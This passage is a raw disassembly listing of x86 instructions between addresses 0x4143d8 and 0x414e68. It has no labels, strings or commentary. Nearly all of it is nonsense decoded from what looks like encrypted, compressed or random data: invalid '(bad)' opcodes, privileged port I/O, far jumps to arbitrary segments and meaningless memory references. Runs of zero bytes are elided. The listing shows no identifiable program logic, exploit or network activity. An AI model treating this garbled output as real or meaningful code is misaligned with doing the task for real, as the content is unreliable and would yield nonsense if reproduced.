  4143d8:	popf   
  4143d9:	cmp    edi,0x6391d2d7
  4143df:	cmp    eax,0x7af5c4d5
  4143e4:	inc    edx
  4143e5:	dec    ebp
  4143e6:	icebp  
  4143e7:	xor    BYTE PTR [esi+0x0],0x54
  4143eb:	data16 xlat BYTE PTR ds:[ebx]
  4143ed:	stos   DWORD PTR es:[edi],eax
  4143ee:	out    0xee,eax
  4143f0:	mov    ds:0x1bbf3b65,al
  4143f5:	not    DWORD PTR [eax+esi*8]
  4143f8:	and    ecx,DWORD PTR [ebx-0x73]
  4143fb:	rcr    DWORD PTR ds:0x62f8ee63,0x89
  414402:	out    0x24,al
  414404:	jecxz  0x4143ba
  414406:	inc    esp
  414407:	mov    ds:0x2f1ab640,al
  41440c:	bound  ebx,QWORD PTR [esi-0x666cdddc]
  414412:	pop    ss
  414413:	pop    ebp
  414414:	adc    DWORD PTR [esi-0x4d],edi
  414417:	push   ebx
  414418:	aam    0xaa
  41441a:	scas   al,BYTE PTR es:[edi]
  41441b:	daa    
  41441c:	sbb    eax,0x88ac9c05
  414421:	mov    ch,0xea
  414423:	inc    ecx
  414424:	push   ebp
  414425:	cli    
  414426:	mov    ebp,0x9d087f3f
  41442b:	jp     0x41444c
  41442d:	jmp    0xa13a:0x189e2013
  414434:	mov    esp,DWORD PTR [ebp-0x399b1409]
  41443a:	aam    0xd5
  41443c:	sub    eax,0xa566645a
  414441:	shr    DWORD PTR [ebp-0x250a59f],1
  414447:	push   esi
  414448:	push   ds
  414449:	mov    ebx,0xea958712
  41444e:	sub    eax,0x774a1325
  414453:	jecxz  0x4144b5
  414455:	jae    0x41442a
  414457:	imul   eax,DWORD PTR [edx-0x62],0xa444f4b0
  41445e:	jmp    0xdef7f07f
  414463:	in     eax,dx
  414464:	data16 sbb al,0x78
  414467:	mov    DWORD PTR [edi-0x4f],edx
  41446a:	ror    ch,cl
  41446c:	mov    ch,0xf1
  41446e:	in     al,dx
  41446f:	outs   dx,BYTE PTR ds:[esi]
  414470:	stc    
  414471:	pusha  
  414472:	fs and eax,0x60dc8c1a
  414478:	pushf  
  414479:	addr16 push ebp
  41447b:	jnp    0x414461
  41447d:	pop    ebp
  41447e:	mov    ds:0x83230dd9,eax
  414483:	adc    ebp,ebp
  414485:	add    edx,ecx
  414487:	push   edi
  414488:	test   DWORD PTR [edi+0x9f9e619],esi
  41448e:	xor    DWORD PTR [edx],ecx
	...
  4144f4:	pop    ebx
  4144f5:	jae    0x414539
  4144f7:	or     eax,0x775f3d6a
  4144fc:	pop    ds
  4144fd:	dec    edi
  4144fe:	or     cl,BYTE PTR [esi+0x60]
  414501:	lock dec ecx
  414503:	popa   
  414504:	in     al,dx
  414505:	aad    0x0
  414507:	add    BYTE PTR [ecx+eax*1],al
  41450a:	add    BYTE PTR [eax],al
  41450c:	xchg   edi,eax
  41450d:	mov    esp,0xdc45c124
  414512:	sub    DWORD PTR [ebx-0x6e],0xffffffd4
  414516:	pop    es
  414517:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414518:	sbb    al,0xa6
  41451a:	sbb    BYTE PTR [edi+0x13bb2d42],ah
  414520:	dec    esi
  414521:	je     0x414593
  414523:	jmp    0x4144b9
  414525:	mov    ds:0x7be5e37d,eax
  41452a:	mov    edx,0x35f03d8b
  41452f:	sub    bl,BYTE PTR [edi]
  414531:	push   ds
  414532:	mov    cl,0xa
  414534:	loopne 0x41456a
  414536:	fadd   DWORD PTR [ecx+0x3d42179d]
  41453c:	(bad)  
  41453d:	mov    ds:0x53b277ca,al
  414542:	xchg   ah,cl
  414544:	push   cs
  414545:	ja     0x41454a
  414547:	fisubr DWORD PTR [esi-0x2c3b9d44]
  41454d:	inc    edi
  41454e:	(bad)  
  41454f:	fbstp  TBYTE PTR [ebp-0x170c86ea]
  414555:	aaa    
  414556:	jl     0x414519
  414558:	in     eax,0xe0
  41455a:	retf   0x6d87
  41455d:	shr    BYTE PTR [edi+0x44],cl
  414560:	icebp  
  414561:	mov    ecx,0xb4a0046a
  414566:	int3   
  414567:	(bad)  
  414568:	into   
  414569:	xor    ecx,ebp
  41456b:	mov    ebp,0xaab4e46e
  414570:	inc    ebp
  414571:	test   BYTE PTR [eax+0x74178570],0x95
  414578:	int    0x74
  41457a:	push   edx
  41457b:	sbb    cl,BYTE PTR [ebx+eax*2-0x2e1b4fa1]
  414582:	cmp    esp,DWORD PTR [ebp+ebp*8-0x6a]
  414586:	call   0xde08:0x67b4e382
  41458d:	and    DWORD PTR [eax-0x200c4770],eax
  414593:	icebp  
  414594:	call   0x3a9e892b
  414599:	pop    ebx
  41459a:	push   ebp
  41459b:	mov    edi,0x2bf89c4
  4145a0:	int3   
  4145a1:	dec    esi
  4145a2:	mov    eax,ds:0x76182208
  4145a7:	bound  esp,QWORD PTR [esi-0x3c]
  4145aa:	add    al,0x55
  4145ac:	pop    esi
  4145ad:	mov    ?,ebx
  4145af:	and    al,0x5f
  4145b1:	fsubr  QWORD PTR [edi-0x663f07ef]
  4145b7:	loop   0x4145b6
  4145b9:	xor    ebp,ebx
  4145bb:	mov    esi,0x37e2f5be
  4145c0:	cmp    DWORD PTR [esi+0x4b23ec72],esp
  4145c6:	inc    esp
  4145c7:	and    ecx,DWORD PTR [ebp+0x4f843faf]
  4145cd:	jmp    0xfe5bc090
  4145d2:	add    BYTE PTR [edi-0x3f],dl
  4145d5:	jbe    0x414574
  4145d7:	xor    edx,DWORD PTR [eax]
  4145d9:	push   0xfffffff1
  4145db:	popf   
  4145dc:	leave  
  4145dd:	cld    
  4145de:	push   esp
  4145df:	pop    ds
  4145e0:	std    
  4145e1:	shl    DWORD PTR [eax+eiz*2-0x2132bec9],cl
  4145e8:	cmc    
  4145e9:	push   esp
  4145ea:	call   0x7501:0xcdf7788
  4145f1:	and    BYTE PTR [ecx+0x39e5a222],cl
  4145f7:	pop    ds
  4145f8:	pop    edi
  4145f9:	ret    0xc958
  4145fc:	jnp    0x414665
  4145fe:	icebp  
  4145ff:	cs jge 0x41459e
  414602:	jo     0x4145b6
  414604:	imul   esi,DWORD PTR [ebx+ebp*8-0x72],0xffffffe2
  414609:	dec    ecx
  41460a:	pop    ds
  41460b:	mov    DWORD PTR [ecx+0x21],edx
  41460e:	fwait
  41460f:	add    DWORD PTR [eax],eax
	...
  414671:	add    BYTE PTR [eax],al
  414673:	add    BYTE PTR [edi+0x5e],bh
  414676:	cmc    
  414677:	ins    DWORD PTR es:[edi],dx
  414678:	cmc    
  414679:	out    dx,eax
  41467a:	call   FWORD PTR [esi+0x17]
  41467d:	enter  0xab7a,0x1c
  414681:	clc    
  414682:	xor    al,0xa4
  414684:	lock (bad) 
  414686:	add    BYTE PTR [eax],al
  414688:	add    al,0x1
  41468a:	add    BYTE PTR [eax],al
  41468c:	inc    ebx
  41468d:	js     0x414614
  41468f:	in     al,0xb8
  414691:	add    al,0x16
  414693:	inc    ecx
  414694:	sbb    bh,BYTE PTR [ebp+0x51]
  414697:	scas   eax,DWORD PTR es:[edi]
  414698:	cld    
  414699:	pop    ebx
  41469a:	and    al,0xe5
  41469c:	mov    ?,WORD PTR [esi+0x44]
  41469f:	push   0xac87039c
  4146a4:	cdq    
  4146a5:	test   dl,cl
  4146a7:	or     eax,0xcd6fe5dd
  4146ac:	sub    cl,BYTE PTR [ebp+0x9]
  4146af:	int    0x51
  4146b1:	gs xchg ebp,eax
  4146b3:	retf   
  4146b4:	test   eax,0xd0d0ff30
  4146b9:	adc    eax,0xa760da7
  4146be:	jge    0x41466f
  4146c0:	push   ebp
  4146c1:	dec    ebp
  4146c2:	mov    bh,0x11
  4146c4:	stos   BYTE PTR es:[edi],al
  4146c5:	call   0x5c797f39
  4146ca:	mov    al,ds:0xa98a6584
  4146cf:	(bad)  
  4146d0:	repnz sbb BYTE PTR [eax+0x6f],0xbb
  4146d5:	out    0x44,eax
  4146d7:	rol    BYTE PTR [ebx],cl
  4146d9:	cdq    
  4146da:	sub    BYTE PTR [edi],dh
  4146dc:	and    eax,0xc42a073b
  4146e1:	and    eax,0xbe4d6d41
  4146e6:	dec    edi
  4146e7:	bound  edi,QWORD PTR ds:0xdc2c7fb7
  4146ed:	cmp    eax,0x940842dd
  4146f2:	adc    ebp,esi
  4146f4:	or     eax,0x7db47c85
  4146f9:	xchg   BYTE PTR [edi+0x6857d5c],bl
  4146ff:	mov    bh,0x3
  414701:	mov    es:0xee5eb584,al
  414707:	std    
  414708:	icebp  
  414709:	sub    DWORD PTR [edi-0x49],ebx
  41470c:	cmc    
  41470d:	out    dx,eax
  41470e:	xor    esi,DWORD PTR [edi-0x3e]
  414711:	xchg   edi,eax
  414712:	mov    WORD PTR [eax+0x5c709a14],ds
  414718:	jecxz  0x414752
  41471a:	jl     0x41474e
  41471c:	das    
  41471d:	cmp    ebx,0xffffff9f
  414720:	push   edi
  414721:	stc    
  414722:	cmp    dl,BYTE PTR [ebx]
  414724:	mov    eax,ds:0xb41d4258
  414729:	stos   DWORD PTR es:[edi],eax
  41472a:	adc    al,0x95
  41472c:	cmp    eax,esp
  41472e:	push   edi
  41472f:	adc    al,0x9
  414731:	jnp    0x414758
  414733:	sar    al,0x4e
  414736:	rcr    ecx,cl
  414738:	push   ds
  414739:	enter  0x791e,0x9e
  41473d:	ins    BYTE PTR es:[edi],dx
  41473e:	sbb    eax,0x9b4a3879
  414743:	and    eax,0x91526bf3
  414748:	pop    ebx
  414749:	jp     0x4147a5
  41474b:	jmp    0x3973:0x511d747c
  414752:	jno    0x4147a9
  414754:	div    ecx
  414756:	push   ds
  414757:	jnp    0x41478e
  414759:	sub    DWORD PTR [ebp+eiz*2+0x727f935],0x6b
  414761:	xchg   esp,eax
  414762:	sti    
  414763:	and    al,0xeb
  414765:	call   0x40198124
  41476a:	jmp    0xb803:0xa207da36
  414771:	cwde   
  414772:	es jmp 0x414762
  414775:	mov    cl,BYTE PTR [esi]
  414777:	stos   BYTE PTR es:[edi],al
  414778:	(bad)  
  414779:	fist   DWORD PTR [ecx+0x7a306ac8]
  41477f:	pop    esi
  414780:	shr    dh,1
  414782:	int3   
  414783:	mov    al,ds:0x69019177
  414788:	mov    eax,ds:0x7cc841a1
  41478d:	and    BYTE PTR [ecx],dl
  41478f:	sbb    eax,DWORD PTR [eax]
	...
  4147f1:	add    BYTE PTR [eax],al
  4147f3:	add    BYTE PTR [esi+0x2f],bh
  4147f6:	add    DWORD PTR [ebp+0x51],ebp
  4147f9:	outs   dx,DWORD PTR ds:[esi]
  4147fa:	jle    0x41483b
  4147fc:	aas    
  4147fd:	mov    BYTE PTR [esi],cl
  4147ff:	cmp    eax,0xb4639a
  414804:	hlt    
  414805:	xlat   BYTE PTR ds:[ebx]
  414806:	add    BYTE PTR [eax],al
  414808:	add    al,0x1
  41480a:	add    BYTE PTR [eax],al
  41480c:	aas    
  41480d:	(bad)  
  41480e:	push   esi
  41480f:	cld    
  414810:	je     0x4147d5
  414812:	or     ch,BYTE PTR [ebp+0x1]
  414815:	sbb    BYTE PTR [esi-0x51],dh
  414818:	lds    esi,FWORD PTR [esi+0x3c4b2b34]
  41481e:	cmp    al,0xa2
  414820:	outs   dx,BYTE PTR ds:[esi]
  414821:	dec    ebx
  414822:	hlt    
  414823:	popf   
  414824:	(bad)  
  414825:	mov    bh,0x3d
  414827:	gs mov dh,0x67
  41482a:	xchg   DWORD PTR [edx+0x3b24737c],edi
  414830:	dec    ebp
  414831:	adc    DWORD PTR [ecx+0x21],edi
  414834:	fmul   QWORD PTR [edx-0x53a713f8]
  41483a:	aad    0x1d
  41483c:	mov    esp,0x3581b058
  414841:	fdiv   DWORD PTR [edx+0x28]
  414844:	xlat   BYTE PTR ds:[ebx]
  414845:	dec    edi
  414846:	pop    ecx
  414847:	dec    esi
  414848:	pop    DWORD PTR [esi]
  41484a:	mov    gs,WORD PTR [esp+eax*2-0x6e]
  41484e:	jno    0x41480e
  414850:	sub    eax,0xdc2b06fa
  414855:	aam    0xd9
  414857:	adc    BYTE PTR [ebp-0x67912524],bl
  41485d:	mov    eax,0xeabc4aa
  414862:	adc    DWORD PTR [edx-0x144f0e9c],0xcd9284f5
  41486c:	xchg   dh,bh
  41486e:	cmp    cl,BYTE PTR [ecx]
  414870:	repz int 0x17
  414873:	xor    al,0xd1
  414875:	and    eax,0xad802666
  41487a:	rcl    BYTE PTR [ecx],0x83
  41487d:	sub    al,0x82
  41487f:	aas    
  414880:	popf   
  414881:	js     0x4148b8
  414883:	outs   dx,BYTE PTR ds:[esi]
  414884:	aam    0x51
  414886:	sbb    ebx,DWORD PTR [ebp-0x7684c8dc]
  41488c:	ins    BYTE PTR es:[edi],dx
  41488d:	inc    edi
  41488e:	cld    
  41488f:	iret   
  414890:	std    
  414891:	or     DWORD PTR [edi+eiz*4+0x4da6889f],0xabca9f1b
  41489c:	mov    ebx,0xb864234b
  4148a1:	in     al,dx
  4148a2:	aam    0x6
  4148a4:	shl    BYTE PTR [esi],cl
  4148a6:	fstp   DWORD PTR [eax-0x7edbc05b]
  4148ac:	pop    ds
  4148ad:	pop    edi
  4148ae:	sub    al,0xca
  4148b0:	jo     0x4148d4
  4148b2:	(bad)  
  4148b3:	mov    WORD PTR [esi+0x7871615],?
  4148b9:	in     al,dx
  4148ba:	pop    edi
  4148bb:	in     eax,dx
  4148bc:	push   0x3db05c47
  4148c1:	lock jae 0x414893
  4148c4:	cmp    dl,BYTE PTR [ecx+0x23]
  4148c7:	(bad)  
  4148c8:	idiv   esp
  4148ca:	ins    BYTE PTR es:[edi],dx
  4148cb:	sub    al,0x71
  4148cd:	xor    eax,0x3cc3eb14
  4148d2:	repz cmp ebp,edx
  4148d5:	mov    ds:0x12f3fadf,al
  4148da:	(bad)  
  4148db:	fdivr  QWORD PTR [ebx+ebx*1+0x57]
  4148df:	mov    ebp,0x6980361a
  4148e4:	xor    al,0x51
  4148e6:	jb     0x4148b9
  4148e8:	sub    BYTE PTR [ecx+0x30],0xc3
  4148ec:	sbb    ah,BYTE PTR [ecx]
  4148ee:	push   ebp
  4148ef:	cmc    
  4148f0:	adc    BYTE PTR [edi],al
  4148f2:	dec    edx
  4148f3:	inc    ebx
  4148f4:	pop    eax
  4148f5:	leave  
  4148f6:	fdivp  st(0),st
  4148f8:	mov    bl,0xa6
  4148fa:	xchg   DWORD PTR [ebp+0x29],ebp
  4148fd:	repz xchg edi,eax
  4148ff:	js     0x4148da
  414901:	adc    DWORD PTR [ebp+0x5a],esi
  414904:	sbb    eax,ecx
  414906:	stos   DWORD PTR es:[edi],eax
  414907:	or     eax,0x3c6fd3b
  41490c:	jge    0x4148e7
  41490e:	jp     0x414891
	...
  414974:	or     edi,DWORD PTR [esi-0x2e]
  414977:	and    esi,edi
  414979:	scas   eax,DWORD PTR es:[edi]
  41497a:	sti    
  41497b:	jle    0x414963
  41497d:	pop    edx
  41497e:	push   ds
  41497f:	pop    es
  414980:	loopne 0x414969
  414982:	xchg   ebp,eax
  414983:	mov    ecx,0xd8f8
  414988:	add    al,0x1
  41498a:	add    BYTE PTR [eax],al
  41498c:	push   0xf0a7f162
  414991:	loope  0x41494c
  414993:	repz rcl BYTE PTR [edx],0xa5
  414997:	add    DWORD PTR [esi-0xfbd34d1],ebp
  41499d:	loopne 0x4149cd
  41499f:	adc    eax,0x4cae6b5d
  4149a4:	and    cl,cl
  4149a6:	jae    0x414a13
  4149a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4149a9:	(bad)  
  4149aa:	fdiv   DWORD PTR [ebp-0x3f3dffbf]
  4149b0:	adc    al,0x9c
  4149b2:	mov    cl,0xe1
  4149b4:	cld    
  4149b5:	mov    ah,0xf9
  4149b7:	xchg   ebx,eax
  4149b8:	test   BYTE PTR [ecx-0x3f4e6a67],0xc1
  4149bf:	cmp    DWORD PTR [esi+ecx*1-0x2d],esp
  4149c3:	int3   
  4149c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4149c5:	call   0x905d:0x3408c36d
  4149cc:	shr    DWORD PTR [ebx-0x306f4d02],cl
  4149d2:	int3   
  4149d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4149d4:	cmp    ah,BYTE PTR [edi]
  4149d6:	pusha  
  4149d7:	dec    esi
  4149d8:	mov    edx,0xc8858a29
  4149dd:	nop
  4149de:	retf   
  4149df:	sbb    DWORD PTR [edx+0x13],esp
  4149e2:	je     0x414a2f
  4149e4:	js     0x414a60
  4149e6:	sub    BYTE PTR [esi],ah
  4149e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4149e9:	ins    DWORD PTR es:[edi],dx
  4149ea:	popf   
  4149eb:	out    dx,eax
  4149ec:	(bad)  
  4149ed:	mov    bl,0xbc
  4149ef:	mov    WORD PTR [esi+0x2d],es
  4149f2:	add    al,0x9c
  4149f4:	ins    BYTE PTR es:[edi],dx
  4149f5:	aas    
  4149f6:	ja     0x414a5d
  4149f8:	stos   BYTE PTR es:[edi],al
  4149f9:	scas   eax,DWORD PTR es:[edi]
  4149fa:	cmp    ah,BYTE PTR [edx+eiz*2+0x4a15737d]
  414a01:	mov    ds:0x20a12493,al
  414a06:	mov    gs,WORD PTR [esi+esi*1+0x32]
  414a0a:	dec    ebp
  414a0b:	push   0x3e
  414a0d:	inc    ebp
  414a0e:	icebp  
  414a0f:	inc    esp
  414a10:	and    DWORD PTR [ebx-0x7eedb4e2],ebp
  414a16:	mov    ebp,ebp
  414a18:	jb     0x414a03
  414a1a:	jp     0x414a27
  414a1c:	out    dx,al
  414a1d:	sbb    al,0xdb
  414a1f:	pop    ebp
  414a20:	fidiv  DWORD PTR [esi+0x6e]
  414a23:	pop    ebx
  414a24:	adc    edi,ebp
  414a26:	sbb    eax,0xcfa0b85c
  414a2b:	ins    DWORD PTR es:[edi],dx
  414a2c:	jecxz  0x4149bf
  414a2e:	adc    eax,eax
  414a30:	call   0x3bd2:0x7aff8b58
  414a37:	xor    eax,0xf86155d9
  414a3c:	aaa    
  414a3d:	xchg   esp,eax
  414a3e:	lods   eax,DWORD PTR ds:[esi]
  414a3f:	das    
  414a40:	jmp    0x4149e7
  414a42:	stc    
  414a43:	mov    al,0x90
  414a45:	addr16 (bad) 
  414a47:	pop    ebp
  414a48:	xchg   al,dl
  414a4a:	mov    ebx,0xa87f64b8
  414a4f:	jl     0x4149dc
  414a51:	inc    edx
  414a52:	mov    ?,ecx
  414a54:	cli    
  414a55:	call   0xa22055f7
  414a5a:	pushf  
  414a5b:	nop
  414a5c:	fcmovu st,st(7)
  414a5e:	jmp    0x1f04:0x380a890
  414a65:	push   esi
  414a66:	mov    dl,0x24
  414a68:	push   eax
  414a69:	ret    0xda02
  414a6c:	xor    dh,BYTE PTR [ebx-0x5c75711c]
  414a72:	sub    BYTE PTR [edi-0x24],dl
  414a75:	inc    ecx
  414a76:	cdq    
  414a77:	mov    al,0x8a
  414a79:	icebp  
  414a7a:	mov    ebx,eax
  414a7c:	jle    0x414adf
  414a7e:	add    DWORD PTR [edi-0x16b6a8e6],edx
  414a84:	mov    esp,0x66bee21b
  414a89:	push   0xf5b1f301
  414a8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a8f:	or     DWORD PTR [eax],eax
	...
  414af1:	add    BYTE PTR [eax],al
  414af3:	add    BYTE PTR [edi+0x7e363ed9],bl
  414af9:	neg    DWORD PTR [edi-0x265c9d07]
  414aff:	arpl   WORD PTR [esi],cx
  414b01:	lea    esp,[esi+0x47]
  414b04:	cld    
  414b05:	fld    DWORD PTR [eax]
  414b07:	add    BYTE PTR [ecx+eax*1],al
  414b0a:	add    BYTE PTR [eax],al
  414b0c:	pop    esi
  414b0d:	imul   esp,esi,0xffffff8f
  414b10:	sub    cl,bh
  414b12:	and    eax,0x906f00b2
  414b17:	(bad)  
  414b18:	int3   
  414b19:	sub    DWORD PTR [ebx],0xffffff8a
  414b1c:	stc    
  414b1d:	out    0x46,al
  414b1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b20:	sahf   
  414b21:	sbb    esi,edx
  414b23:	out    dx,eax
  414b24:	scas   eax,DWORD PTR es:[edi]
  414b25:	inc    edx
  414b26:	jl     0x414b6b
  414b28:	jp     0x414b07
  414b2a:	or     bl,BYTE PTR [edx]
  414b2c:	int    0x6d
  414b2e:	jo     0x414b19
  414b30:	ja     0x414b7c
  414b32:	sub    ah,BYTE PTR [edi]
  414b34:	loop   0x414acb
  414b36:	jle    0x414adb
  414b38:	jmp    0x414b40
  414b3a:	sub    DWORD PTR [edx+esi*4-0x54],esi
  414b3e:	mov    esp,0xf5928e22
  414b43:	stos   BYTE PTR es:[di],al
  414b45:	bswap  esi
  414b47:	aaa    
  414b48:	push   ecx
  414b49:	xchg   edi,eax
  414b4a:	fldenv [ebx]
  414b4c:	mov    cl,0xa
  414b4e:	ds pop esp
  414b50:	enter  0xa94b,0x3c
  414b54:	mov    ch,ah
  414b56:	mov    edx,0x70fed225
  414b5b:	fld    DWORD PTR [edi-0x80]
  414b5e:	mov    BYTE PTR [edx],dl
  414b60:	sub    eax,0x842ed9a5
  414b65:	or     eax,DWORD PTR [ebp+0x2c]
  414b68:	je     0x414b5d
  414b6a:	xchg   DWORD PTR [ebx-0x4898ff51],eax
  414b70:	dec    ebx
  414b71:	je     0x414bce
  414b73:	cmp    al,0x2d
  414b75:	call   0x9118:0xb68774df
  414b7c:	jo     0x414b74
  414b7e:	daa    
  414b7f:	and    edx,DWORD PTR [ebx-0x7f]
  414b82:	mov    WORD PTR [eax+0x56b3ba1a],fs
  414b88:	hlt    
  414b89:	xor    BYTE PTR [esi+ebp*8+0x2b90f114],bl
  414b90:	inc    esp
  414b91:	hlt    
  414b92:	mov    esp,0xd9d7077f
  414b97:	scas   al,BYTE PTR es:[edi]
  414b98:	das    
  414b99:	fdivr  QWORD PTR [edx-0x7f356261]
  414b9f:	ficom  DWORD PTR [eax+0x62]
  414ba2:	mov    ds:0xf475b4e7,al
  414ba7:	lds    ecx,FWORD PTR [edi-0x70]
  414baa:	xlat   BYTE PTR ds:[ebx]
  414bab:	ret    
  414bac:	and    eax,0x3c5d02d2
  414bb1:	fldcw  WORD PTR [ebp+0x70b00b1b]
  414bb7:	in     eax,0x68
  414bb9:	repnz dec ebx
  414bbb:	leave  
  414bbc:	mov    ?,esp
  414bbe:	call   0x43e4be6d
  414bc3:	loopne 0x414bd1
  414bc5:	jge    0x414be2
  414bc7:	mov    dh,0xef
  414bc9:	div    BYTE PTR [ebp-0x34]
  414bcc:	push   edx
  414bcd:	pop    es
  414bce:	sub    eax,0x6eab7e02
  414bd3:	je     0x414b67
  414bd5:	sub    dl,cl
  414bd7:	pop    ecx
  414bd8:	push   es
  414bd9:	pop    ss
  414bda:	sub    dl,BYTE PTR [ebx]
  414bdc:	and    cl,cl
  414bde:	mov    edi,0x2b6a59a7
  414be3:	cmp    DWORD PTR [ecx+0x66dce3a0],0x4c33dc7
  414bed:	jmp    FWORD PTR [edi]
  414bef:	push   ds
  414bf0:	ds sahf 
  414bf2:	(bad)  
  414bf3:	dec    edx
  414bf4:	imul   edi,DWORD PTR [ebx],0x7e
  414bf7:	stos   BYTE PTR es:[edi],al
  414bf8:	and    ax,0x9e22
  414bfc:	dec    esp
  414bfd:	push   edi
  414bfe:	cmp    al,0x0
  414c00:	aaa    
  414c01:	hlt    
  414c02:	inc    edx
  414c03:	lea    esp,[edx+0x31]
  414c06:	push   edi
  414c07:	shr    DWORD PTR [esi],0x55
  414c0a:	loop   0x414c10
  414c0c:	xchg   edi,eax
  414c0d:	js     0x414c5c
  414c0f:	int    0x0
	...
  414c71:	add    BYTE PTR [eax],al
  414c73:	add    BYTE PTR [esp+eiz*2],dh
  414c76:	push   ds
  414c77:	jl     0x414cd7
  414c79:	jle    0x414cf1
  414c7b:	ins    BYTE PTR es:[edi],dx
  414c7c:	out    0x12,al
  414c7e:	adc    edi,DWORD PTR cs:[edi+0x74]
  414c82:	es ltr bx
  414c86:	add    BYTE PTR [eax],al
  414c88:	add    al,0x1
  414c8a:	add    BYTE PTR [eax],al
  414c8c:	rcl    DWORD PTR [ecx+ecx*8-0x71908f50],1
  414c93:	xchg   BYTE PTR [esi+ebp*2+0x7745a25],bh
  414c9a:	jmp    0x5c5:0x3fb3c65e
  414ca1:	and    BYTE PTR [esi-0x25],al
  414ca4:	test   dh,ah
  414ca6:	adc    ah,0x61
  414ca9:	mov    edx,0x120d1c41
  414cae:	mov    bl,0xf1
  414cb0:	jbe    0x414c53
  414cb2:	push   es
  414cb3:	imul   ebp,DWORD PTR [ebp+0x7a],0x6d97e0bf
  414cba:	test   al,0x1e
  414cbc:	ror    ah,0x11
  414cbf:	pop    ecx
  414cc0:	test   al,0x83
  414cc2:	sti    
  414cc3:	jmp    0x414c8f
  414cc5:	ja     0x414c62
  414cc7:	fdivr  DWORD PTR [ebp+0x5769a540]
  414ccd:	out    dx,al
  414cce:	mov    fs,WORD PTR [eax+edx*2-0x70]
  414cd2:	in     eax,dx
  414cd3:	aaa    
  414cd4:	mov    dl,0x3
  414cd6:	mov    ds:0xbab98589,al
  414cdb:	add    dh,BYTE PTR [eax+eax*2+0x23]
  414cdf:	in     eax,dx
  414ce0:	test   eax,0x67c442a3
  414ce5:	jmp    FWORD PTR [eax]
  414ce7:	aas    
  414ce8:	sbb    al,0xa9
  414cea:	es dec edx
  414cec:	push   cs
  414ced:	nop
  414cee:	and    ebx,DWORD PTR [ecx+ebp*4+0x5a]
  414cf2:	xchg   edi,eax
  414cf3:	shr    DWORD PTR [ebp-0x7e98a61],cl
  414cf9:	adc    eax,0x88e0c965
  414cfe:	mov    al,ds:0x675c3454
  414d03:	hlt    
  414d04:	or     BYTE PTR [edx+0x477ef7],bh
  414d0a:	sbb    al,0x59
  414d0c:	add    esi,DWORD PTR [eax-0xadc93cc]
  414d12:	mov    al,0xeb
  414d14:	add    al,0xb6
  414d16:	add    DWORD PTR [edi],edi
  414d18:	das    
  414d19:	sbb    eax,0xa3f8dc0a
  414d1e:	retf   0x6572
  414d21:	outs   dx,BYTE PTR ds:[esi]
  414d22:	lahf   
  414d23:	pop    ebp
  414d24:	pop    esi
  414d25:	mov    ds:0x24de8aa5,eax
  414d2a:	fs in  al,dx
  414d2c:	add    DWORD PTR [ecx+esi*2-0x2b01ac50],ebx
  414d33:	stos   DWORD PTR es:[edi],eax
  414d34:	push   cs
  414d35:	mov    bl,ah
  414d37:	shl    BYTE PTR [esi-0x2],1
  414d3a:	out    dx,eax
  414d3b:	mov    ds,WORD PTR [edx-0x6026af6e]
  414d41:	iret   
  414d42:	pushf  
  414d43:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d44:	div    edi
  414d46:	call   0xdd76:0xbc07a1b7
  414d4d:	lahf   
  414d4e:	mov    ch,0x27
  414d50:	aad    0x20
  414d52:	add    edi,ebx
  414d54:	mov    ebx,0x9126b181
  414d59:	push   edx
  414d5a:	mov    esi,0xdf866386
  414d5f:	fs dec ebp
  414d61:	jg     0x414d14
  414d63:	mov    eax,0xab63de83
  414d68:	xor    edx,DWORD PTR [esp+ebp*4]
  414d6b:	scas   eax,DWORD PTR es:[edi]
  414d6c:	scas   eax,DWORD PTR es:[edi]
  414d6d:	pop    edi
  414d6e:	or     eax,0x35315051
  414d73:	repz popf 
  414d75:	ret    
  414d76:	mov    bl,0x72
  414d78:	xchg   esp,eax
  414d79:	arpl   WORD PTR [edi],dx
  414d7b:	jo     0x414d5c
  414d7d:	cmp    BYTE PTR [ecx+0x76],cl
  414d80:	adc    al,0xea
  414d82:	xchg   ecx,eax
  414d83:	stos   BYTE PTR es:[edi],al
  414d84:	(bad)  
  414d85:	mov    edx,0xc17b6dc8
  414d8a:	dec    esp
  414d8b:	bound  esi,QWORD PTR [edx+esi*1+0x5dcc]
	...
  414df2:	add    BYTE PTR [eax],al
  414df4:	mov    bh,0x99
  414df6:	adc    dl,BYTE PTR [ecx-0x404864c2]
  414dfc:	in     al,dx
  414dfd:	xor    dh,BYTE PTR [esi]
  414dff:	adc    eax,0x678d5e57
  414e04:	add    al,0xdc
  414e06:	add    BYTE PTR [eax],al
  414e08:	add    al,0x1
  414e0a:	add    BYTE PTR [eax],al
  414e0c:	pop    esp
  414e0d:	aas    
  414e0e:	cmp    BYTE PTR [ebp+0x52],cl
  414e11:	pop    es
  414e12:	and    BYTE PTR [ecx],bl
  414e14:	jae    0x414dfd
  414e16:	pop    ebx
  414e17:	xlat   BYTE PTR ds:[ebx]
  414e18:	xor    eax,0xa538968f
  414e1d:	addr16 jae 0x414e67
  414e20:	popa   
  414e21:	fcomp  DWORD PTR [eax+0x42]
  414e24:	mov    bh,0x9c
  414e26:	mov    eax,ecx
  414e28:	or     eax,DWORD PTR [esi+0x2c389de8]
  414e2e:	pusha  
  414e2f:	push   es
  414e30:	std    
  414e31:	fistp  QWORD PTR [ebx]
  414e33:	call   0x309899a2
  414e38:	cli    
  414e39:	call   0x823f4378
  414e3e:	fsub   DWORD PTR [si-0x313b]
  414e43:	(bad)  
  414e44:	mov    bh,BYTE PTR [eax+0x11]
  414e47:	psubusb mm6,QWORD PTR [edx]
  414e4a:	mov    dl,0x9b
  414e4c:	into   
  414e4d:	dec    DWORD PTR [esi]
  414e4f:	dec    edi
  414e50:	push   esp
  414e51:	sub    DWORD PTR [esi],ecx
  414e53:	mov    eax,0x5dff77ed
  414e58:	xlat   BYTE PTR ds:[ebx]
  414e59:	cmp    al,0xf7
  414e5b:	add    dh,dh
  414e5d:	sbb    al,0x66
  414e5f:	jno    0x414e96
  414e61:	cmp    bh,BYTE PTR [edx+0x5f8fcdfa]
  414e67:	pop    eax
  414e68:	test   ecx,eax
